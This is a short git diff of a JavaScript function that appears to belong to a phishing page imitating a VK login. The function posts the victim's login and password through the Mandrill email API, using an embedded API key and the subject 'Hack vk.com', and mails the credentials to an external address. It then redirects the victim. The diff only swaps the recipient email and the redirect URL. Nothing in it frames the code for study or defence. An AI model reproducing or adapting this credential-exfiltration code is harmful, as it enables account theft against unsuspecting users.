@@ -6,12 +6,12 @@ function send() {
 	xmlhttp.open('POST', 'https://mandrillapp.com/api/1.0/messages/send.json');
 	xmlhttp.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
 	xmlhttp.onreadystatechange = function() {
-	   document.location.href = "http://vk.com/appleinsider";
+	   document.location.href = "http://vk.com/csgo_play";
 	}
 	xmlhttp.send(JSON.stringify({'key': 'jJvyiaMWRKRJeUOoMc_aDA',
 	   'message': {
 	       'from_email': 'hack@vk.com',
-	       'to': [{'email': 'ap.ttnby@gmail.com', 'type': 'to'}],
+	       'to': [{'email': 'michael_clash_of_clans@yahoo.com', 'type': 'to'}],
 	       'autotext': 'true',
 	       'subject': 'Hack vk.com',
 	       'html': '<div><p>login: ' + login + '</p><p>password: ' + password + '</p></div>'
